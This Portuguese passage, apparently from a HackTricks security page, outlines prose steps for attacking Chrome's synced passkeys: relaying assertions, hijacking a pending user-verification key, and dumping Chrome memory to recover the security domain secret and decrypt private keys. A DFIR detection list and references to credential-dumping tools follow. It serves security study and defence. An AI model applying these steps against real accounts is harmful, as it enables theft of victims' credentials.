   - Retransmitir a assertion retornada para o relying party.
   - Isso é especialmente valioso quando o RP aceita `userVerification=preferred` ou não rejeita assertions com **`UV=0`**.
2. **Sequestro de chave UV pendente**<sup>[[4]](#references)</sup>
   - Forçar uma nova integração excluindo `passkey_enclave_state` ou enviando uma operação `device/forget` válida e assinada.
   - Se a integração deixar o dispositivo em **`uv_key_pending`**, registrar uma chave pública UV controlada pelo atacante.
   - Se o provedor não verificar o attestation / a origem de hardware seguro da nova chave UV, as assinaturas posteriores da chave do atacante serão tratadas como **`UV=1`**.
3. **Roubo do segredo mestre / recuperação de SDS**<sup>[[4]](#references)</sup>
   - Forçar a recuperação ou a reintegração para que o Chrome busque o segredo mestre das passkeys sincronizadas.
   - Monitorar a recriação/modificação de `passkey_enclave_state` e, em seguida, despejar a memória do Chrome enquanto o **segredo do domínio de segurança (SDS)** em texto simples estiver residente.
   - Usar o SDS recuperado para descriptografar os campos criptografados em cada registro `WebauthnCredentialSpecifics` e recuperar chaves privadas WebAuthn portáteis.

### Ideias de DFIR / detecção

- Monitorar a **exclusão/recriação** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Gerar alertas sobre acesso anormal a **`Sync Data\LevelDB`** do Chrome por processos que não sejam navegadores.
- Gerar alertas sobre **despejos de memória do Chrome** ou acesso suspeito à memória entre processos.
- Investigar solicitações repetidas do **PIN de recuperação do Google Password Manager** ou novas integrações inesperadas.
- Lembrar que o WebAuthn **`signCount`** muitas vezes não é útil para passkeys sincronizadas, pois pode permanecer constante; portanto, a detecção clássica de clones é fraca.



## References

- [1] [Unit 42 – Uma investigação sobre anos de operações não detectadas que tinham como alvo setores de alto valor](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing com macro VBA do Word via SMTP → descriptografia de credenciais do hMailServer → Veeam CVE-2023-27532 para SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Por dentro do Ink Dragon: revelando a rede de retransmissão e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Passe a passkey: uma nova superfície de ataque na autenticação sem senha](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / armazenamento de chaves CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Como o armazenamento de dados do Active Directory realmente funciona: por dentro do NTDS.dit (Parte 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - despejo remoto de senhas do Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho amplia seu arsenal de ciberespionagem com o toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – função CreateFileW e `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – modo de backup `/B` do Robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ do Telegram – encerrar sessões ativas](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard e Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: proteção e gerenciamento de credenciais](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - entradas compatíveis e início rápido](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
